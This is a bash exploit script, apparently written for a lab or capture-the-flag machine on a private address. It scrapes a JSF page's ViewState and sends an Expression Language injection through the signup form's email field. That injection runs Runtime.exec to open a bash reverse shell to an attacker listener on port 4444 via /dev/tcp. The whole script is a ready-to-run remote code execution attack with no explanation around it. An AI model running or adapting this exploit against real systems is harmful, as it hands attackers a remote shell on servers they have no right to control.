#!/bin/bash

# ============================================================================
# QUICK RCE ONE-LINER
# ============================================================================

TARGET="http://10.129.228.116:8080/userSubscribe.faces"
ATTACKER_IP="10.10.16.187"
ATTACKER_PORT="4444"

echo "[*] Fetching ViewState..."
VIEWSTATE=$(curl -s "$TARGET" | grep -oP 'value="\K[a-zA-Z0-9+/=]+(?=")' | head -1)

if [ -z "$VIEWSTATE" ]; then
    echo "[-] Could not extract ViewState!"
    exit 1
fi

echo "[+] ViewState: ${VIEWSTATE:0:50}..."
echo ""
echo "[*] Sending RCE payload..."

# RCE Payload using EL injection
RCE_PAYLOAD="\${Runtime.getRuntime().exec(new String[]{\"/bin/bash\",\"-c\",\"bash -i >& /dev/tcp/$ATTACKER_IP/$ATTACKER_PORT 0>&1\"})}"

# Send the payload
curl -s -X POST "$TARGET" \
  -d "j_id_jsp_1623871077_1:email=$RCE_PAYLOAD" \
  -d "j_id_jsp_1623871077_1:submit=SIGN UP" \
  -d "j_id_jsp_1623871077_1_SUBMIT=1" \
  -d "javax.faces.ViewState=$VIEWSTATE" \
  > /dev/null

echo "[+] Payload sent!"
echo "[*] Check your netcat listener..."
echo ""
echo "If no shell appears, try:"
echo "  python3 rce_payload.py"
